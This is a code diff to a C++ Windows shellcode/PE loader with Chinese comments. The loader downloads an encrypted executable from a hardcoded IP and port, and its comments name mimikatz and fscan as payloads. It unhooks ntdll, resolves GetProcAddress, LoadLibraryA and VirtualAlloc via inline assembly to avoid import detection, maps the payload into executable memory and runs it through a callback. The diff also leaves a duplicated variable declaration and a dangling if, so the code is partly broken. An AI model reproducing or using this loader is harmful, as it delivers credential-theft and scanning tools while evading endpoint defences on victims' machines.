@@ -90,6 +90,98 @@ DWORD _getKernelBase()
     return dwDllBase1;
 }
 
+DWORD _getProcessAddress(DWORD address_base)
+{
+    //address_base = 0x76860000;
+    DWORD dwDllBase1;
+    __asm {
+
+        /* push ebp
+         mov ebp, esp
+         sub esp, 0x40*/
+         //xor ecx, ecx
+
+        mov ebx, [address_base]; EBX = Base address
+        mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
+        add edx, ebx; EDX = PE Header
+        mov edx, [edx + 0x78]; EDX = export table
+        add edx, ebx; EDX = Export table
+        mov esi, [edx + 0x20]; ESI = namestable
+        add esi, ebx; ESI = Names table
+        xor ecx, ecx; EXC = 0
+        Get_Function:
+        inc ecx; Increment the ordinal
+            lodsd; Get name
+            add eax, ebx; Get function name
+            cmp[eax], 50746547h; GetP
+            jnz Get_Function
+            cmp[eax + 0x04], 41636f72h; rocA
+            jnz Get_Function
+            cmp[eax + 0x08], 65726464h; ddre
+            jnz Get_Function
+            mov esi, [edx + 0x24]; ESI = ordinals
+            add esi, ebx; ESI = Ordinals table
+            mov cx, [esi + ecx * 2]; Number of function
+            dec ecx
+            mov esi, [edx + 0x1c];  address table
+            add esi, ebx; ESI = Address table
+            mov edx, [esi + ecx * 4]; EDX = Pointer()
+            add edx, ebx; EDX = GetProcAddress
+            mov eax, edx
+            mov DWORD PTR dwDllBase1, eax
+            /* add esp, 0x40
+             mov esp, ebp
+             pop ebp
+             ret*/
+
+    }
+    return dwDllBase1;
+
+}
+
+
+DWORD getFunction_LoadLibraryA(DWORD getproaddress, DWORD kernel32) {
+    DWORD dwDllBase1 = 0;
+    __asm {
+        /* push ebp
+       mov ebp, esp*/
+        mov eax, getproaddress
+        push 0x00
+        push 0x41797261 // Ayra
+        push 0x7262694c // rbiL
+        push 0x64616f4c // daoL
+        push esp
+        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
+        call getproaddress; [ebp - 8] ->GetProcAddress Addr
+        mov DWORD PTR dwDllBase1, eax
+
+    }
+    return dwDllBase1;
+
+}
+
+
+
+DWORD getFunction_VirtualAllocA(DWORD getproaddress, DWORD kernel32) {
+    DWORD dwDllBase1 = 0;
+    __asm {
+        /* push ebp
+       mov ebp, esp*/
+        mov eax, getproaddress
+        push 0x00
+        push 0x636f6c6c // coll
+        push 0x416c6175 // Alau
+        push 0x74726956 // triV
+        push esp
+        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
+        call getproaddress; [ebp - 8] ->GetProcAddress Addr
+        mov DWORD PTR dwDllBase1, eax
+
+    }
+    return dwDllBase1;
+
+}
+
 // 进行aes解密
 void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
     HCRYPTPROV hProv;
@@ -186,7 +278,7 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
             pszOutBuffer = new char[dwSize + 1];
             if (!pszOutBuffer)
             {
-                printf("Out of memory\n");
+                //printf("Out of memory\n");
                 dwSize = 0;
             }
             else
@@ -209,12 +301,12 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
 
         if (buffer.empty() == TRUE)
         {
-            printf("Failed in retrieving the Shellcode");
+            //printf("Failed in retrieving the Shellcode");
         }
 
         // Report any errors.
         if (!bResults)
-            printf("Error %d has occurred.\n", GetLastError());
+            //printf("Error %d has occurred.\n", GetLastError());
 
         // Close any open handles.
         if (hRequest) WinHttpCloseHandle(hRequest);
@@ -399,13 +491,13 @@ void FixBaseRelocTable(PVOID ModuleBase, IMAGE_NT_HEADERS* NTHeader)
   
       //定位到可选PE头里拿到ImageBase
       OriginalImageBase = NTHeader->OptionalHeader.ImageBase;
-      printf("OriginalImageBase is :%p\n", OriginalImageBase);
+      //printf("OriginalImageBase is :%p\n", OriginalImageBase);
       //定位到可选PE头的DataDirArray里的重定位表
       ImageDataDirectory = NTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
       //重定位表的实际地址 第一个块的初始地址
       pImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((ULONG)ModuleBase + ImageDataDirectory.VirtualAddress);
-      printf("pImageBaseRelocation old address is :%p\n", pImageBaseRelocation);
-      printf("pImageBaseRelocation old values is :%x\n", *pImageBaseRelocation);
+      //printf("pImageBaseRelocation old address is :%p\n", pImageBaseRelocation);
+      //printf("pImageBaseRelocation old values is :%x\n", *pImageBaseRelocation);
       if (pImageBaseRelocation == NULL)
       {
           return;
@@ -413,7 +505,7 @@ void FixBaseRelocTable(PVOID ModuleBase, IMAGE_NT_HEADERS* NTHeader)
       
       while (pImageBaseRelocation->SizeOfBlock)  // 判断是否到重定位表底部
       {
-          printf("pImageBaseRelocation->SizeOfBlock is : %x \n", pImageBaseRelocation->SizeOfBlock);
+          //printf("pImageBaseRelocation->SizeOfBlock is : %x \n", pImageBaseRelocation->SizeOfBlock);
           
           typedef struct
           {
@@ -429,17 +521,17 @@ void FixBaseRelocTable(PVOID ModuleBase, IMAGE_NT_HEADERS* NTHeader)
               {
                  uRelocAddress = (int*)(pTypeOffset[uIndex].offset + pImageBaseRelocation->VirtualAddress + (int)ModuleBase);
                  *uRelocAddress = (int)ModuleBase + (*uRelocAddress - OriginalImageBase);
-                 printf("ModuleBase is : %x\n", ModuleBase);
-                 printf("RelocAddress is : %x\n", *uRelocAddress);
+                 //printf("ModuleBase is : %x\n", ModuleBase);
+                 //printf("RelocAddress is : %x\n", *uRelocAddress);
              }
         }
           pImageBaseRelocation = (IMAGE_BASE_RELOCATION*)((ULONG)pImageBaseRelocation + pImageBaseRelocation->SizeOfBlock);
-          printf("pImageBaseRelocation new address is :%p\n", pImageBaseRelocation);
-          printf("pImageBaseRelocation new values is :%x\n", *pImageBaseRelocation);
+          //printf("pImageBaseRelocation new address is :%p\n", pImageBaseRelocation);
+          //printf("pImageBaseRelocation new values is :%x\n", *pImageBaseRelocation);
     }
 
       // 输出更新的重定向表地址
-      printf("aaapImageBaseRelocation new address is :%x\n", *(PIMAGE_BASE_RELOCATION)((ULONG)ModuleBase + ImageDataDirectory.VirtualAddress));
+      //printf("aaapImageBaseRelocation new address is :%x\n", *(PIMAGE_BASE_RELOCATION)((ULONG)ModuleBase + ImageDataDirectory.VirtualAddress));
   }
 // 从文件第一个字节定位到PE文件的头
 char* GetNTHeaders(char* pe_buffer)
@@ -505,16 +597,16 @@ bool applyReloc(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr, SIZE_T mo
             if (entry == NULL || type == 0)
                 break;
             if (type != RELOC_32BIT_FIELD) {
-                printf("    [!] Not supported relocations format at %d: %d\n", (int)i, (int)type);
+                //printf("    [!] Not supported relocations format at %d: %d\n", (int)i, (int)type);
                 return false;
             }
             if (reloc_field >= moduleSize) {
-                printf("    [-] Out of Bound Field: %lx\n", reloc_field);
+                //printf("    [-] Out of Bound Field: %lx\n", reloc_field);
                 return false;
             }
 
             size_t* relocateAddr = (size_t*)(size_t(modulePtr) + reloc_field);
-            printf("    [V] Apply Reloc Field at %x\n", relocateAddr);
+            //printf("    [V] Apply Reloc Field at %x\n", relocateAddr);
             (*relocateAddr) = ((*relocateAddr) - oldBase + newBase);
             entry = (BASE_RELOCATION_ENTRY*)(size_t(entry) + sizeof(BASE_RELOCATION_ENTRY));
         }
@@ -530,22 +622,30 @@ bool RepairIAT(PVOID modulePtr)
 
     size_t maxSize = importsDir->Size;  // 导入表的长度
     size_t impAddr = importsDir->VirtualAddress;  // 导入表的起始位置
-    printf("impAddr: %p\n", impAddr);
+    printf("modulePtr: %p\n", modulePtr);
 
     IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
     size_t parsedSize = 0;
-
+    DWORD kernel32_address = _getKernelBase();
+    DWORD process_address = _getProcessAddress(kernel32_address);
+    printf("aaprocess address is :%d\n", process_address);
+    typedef FARPROC(WINAPI* GetProcessAddressa)(HMODULE hModule,LPCSTR lpProcName);
+    GetProcessAddressa GetProcessAddressB = (GetProcessAddressa) _getProcessAddress(kernel32_address);
+    typedef HMODULE(WINAPI* LoadLibraryAB)(LPCSTR lpLibFileName);
+    LoadLibraryAB LoadLibraryAa = (LoadLibraryAB)getFunction_LoadLibraryA(process_address, kernel32_address);
+    printf("aaaloadlibrary address :%p\n", LoadLibraryAa);
+    printf("GetProcessAddressB address :%p\n", GetProcessAddressB);
     for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
         // 获取libname的 VA 地址
         lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);
-        printf("lib_desc:%p\n", lib_desc);
+        //printf("lib_desc:%p\n", lib_desc);
         
 
         if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
         // 获取到导入dll的名字
         LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);
-        printf("imagebase:%p\n", modulePtr);
-        printf("lib_name: %s\n", lib_name);
+        //printf("imagebase:%p\n", modulePtr);
+        //printf("lib_name: %s\n", lib_name);
 
         size_t call_via = lib_desc->FirstThunk;  // IAT
         size_t thunk_addr = lib_desc->OriginalFirstThunk;  // INT
@@ -560,7 +660,7 @@ bool RepairIAT(PVOID modulePtr)
             // 判断是否通过序号定位函数
             if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64) 
             {
-                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址 0xFFFF取出低十六位
+                size_t addr = (size_t)GetProcessAddressB(LoadLibraryAa(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址 0xFFFF取出低十六位
                 fieldThunk->u1.Function = addr;  // 获取到的地址赋值给IAT
 
             }
@@ -571,9 +671,9 @@ bool RepairIAT(PVOID modulePtr)
 
                 PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);   //IMAGE_IMPORT_BY_NAME结构体
                 LPSTR func_name = (LPSTR)by_name->Name;  // 函数名
-                
+                printf("modulePtr: %p\n", modulePtr);
 
-                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name); //通过INT里的函数名获取函数地址
+                size_t addr = (size_t)GetProcessAddressB(LoadLibraryAa(lib_name), func_name); //通过INT里的函数名获取函数地址
                 printf("func_name: %s ,address is :%p\n", func_name, addr);
                 // 以下是填充一些杂七杂八的运行参数
                 if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
@@ -629,6 +729,12 @@ void PELoader(char* data, DWORD datasize)
     // 获取命令行参数
     masqueradeCmdline();
 
+    DWORD kernel32_address = _getKernelBase();
+    DWORD process_address = _getProcessAddress(kernel32_address);
+    typedef HMODULE(WINAPI* LoadLibraryAB)(LPCSTR lpLibFileName);
+    typedef LPVOID(WINAPI* VirtualAllocB)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+    LoadLibraryAB LoadLibraryAa = (LoadLibraryAB)getFunction_LoadLibraryA(process_address, kernel32_address);
+    VirtualAllocB VirtualAlloca = (VirtualAllocB)getFunction_VirtualAllocA(process_address, kernel32_address);
     unsigned int chksum = 0;
     for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; }; // 校验码
 
@@ -643,23 +749,26 @@ void PELoader(char* data, DWORD datasize)
     }
 
     IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取基地址重定位表
-    printf("relocDir: %p\n", relocDir);
+    //printf("relocDir: %p\n", relocDir);
     preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase; // 获取PE文件中的镜像基址
-    printf("preferAddr: %p\n", preferAddr);
+    //printf("preferAddr: %p\n", preferAddr);
 
 
-    HMODULE dll = LoadLibraryA("ntdll.dll");
+    HMODULE dll = LoadLibraryAa("ntdll.dll");
+     printf("Loadlibrary address :%p\n", LoadLibraryAa);
     // 强制卸载
     ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
+    
+     printf("virtualloc address :%p\n", VirtualAlloca);
     // 根据PE文件加载到内存占用的总大小申请内存
-    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pImageBase = (BYTE*)VirtualAlloca(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     printf("pImageBase: %p\n", pImageBase);
     if (!pImageBase) {
         if (!relocDir) {
             exit(0);
         }
         else {
-            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            pImageBase = (BYTE*)VirtualAlloca(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
             printf("pImageBase: %p\n", pImageBase);
             if (!pImageBase)
             {
@@ -672,35 +781,35 @@ void PELoader(char* data, DWORD datasize)
 
     // 将镜像基址赋值到pe文件头
     ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
-    printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
+    //printf("ntHeader->OptionalHeader.ImageBase: %p\n", ntHeader->OptionalHeader.ImageBase);
     // 将文件头拷贝到内存中
     memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
     // 文件头的节
     IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
-    printf("SectionHeaderArr:%p\n",SectionHeaderArr);
+    //printf("SectionHeaderArr:%p\n",SectionHeaderArr);
     // 依次通过节数把文件中的数据拷贝到内存中
-    printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
+    //printf("ntHeader->FileHeader.NumberOfSections is :%p \n", ntHeader->FileHeader.NumberOfSections);
     for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
     {
         memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
     }
+    printf("pImageBase address is :%p\n", pImageBase);
     // 修复IAT
     //FixBaseRelocTable(pImageBase, ntHeader);
     RepairIAT(pImageBase);
+    printf("pImageBase address is :%p\n", pImageBase);
     // 修复重定向表
     if (pImageBase != preferAddr)
         if (applyReloc((size_t)pImageBase, (size_t)preferAddr, pImageBase, ntHeader->OptionalHeader.SizeOfImage))
-            puts("[+] Relocation Fixed.");
+            //puts("[+] Relocation Fixed.");
     // asm获取dll基址
     //DWORD kernelbase = _getKernelBase();
     //printf("kernelbase address is: %p", kernelbase);
     // 程序入口点
+    size_t retAddr = 0;
     size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
-    printf("retAddr: %p\n", retAddr);
-    printf("Well jmp: %p\n", retAddr-2330);
-
-    BOOL AA=EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
-    printf("AA: %d\n", AA);
+    EnumThreadWindows(0, (WNDENUMPROC)retAddr, 0);
+    //printf("AA: %d\n", AA);
 
 }
 
@@ -720,7 +829,7 @@ LPVOID getNtdll() {
 
     if (!pi.hProcess)
     {
-        printf("[-] Error creating process\r\n");
+        //printf("[-] Error creating process\r\n");
         return NULL;
     }
 
@@ -735,7 +844,7 @@ LPVOID getNtdll() {
     SIZE_T dwRead;
     BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
     if (!bSuccess) {
-        printf("Failed in reading ntdll (%u)\n", GetLastError());
+        //printf("Failed in reading ntdll (%u)\n", GetLastError());
         return NULL;
     }
 
@@ -770,7 +879,7 @@ BOOL Unhook(LPVOID cleanNtdll) {
             BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                 sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
             if (!ProtectStatus1) {
-                printf("Failed to change the protection (%u)\n", GetLastError());
+                //printf("Failed to change the protection (%u)\n", GetLastError());
                 return FALSE;
             }
 
@@ -782,7 +891,7 @@ BOOL Unhook(LPVOID cleanNtdll) {
             BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                 sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
             if (!ProtectStatus2) {
-                printf("Failed to change the protection back (%u)\n", GetLastError());
+                //printf("Failed to change the protection back (%u)\n", GetLastError());
                 return FALSE;
             }
 
@@ -807,13 +916,13 @@ int main(int argc, char** argv) {
     // 获取一个加密的PE文件
     wchar_t* whost= L"101.42.175.89";
     DWORD port= 65522;
-    wchar_t* wpe = L"netspy32.exe";   //mimikatz.exe   fscan32.exe  main.exe fscan32.exe
+    wchar_t* wpe = L"fscan32.exe";   //mimikatz.exe   fscan32.exe  main.exe fscan32.exe
     //char* host1 = argv[1];
     //DWORD port1 = atoi(argv[2]);
     //char* pe1 = argv[3];
     //char* key1 = argv[4];
     DATA PE = GetData(whost, port, wpe);
-    printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
+    printf("address is :%p\n the lenght is : %d\n",PE.data,PE.len);
     sz_masqCmd_Ansi = (char*)"moo1";
     PELoader((char*)PE.data, PE.len);
     
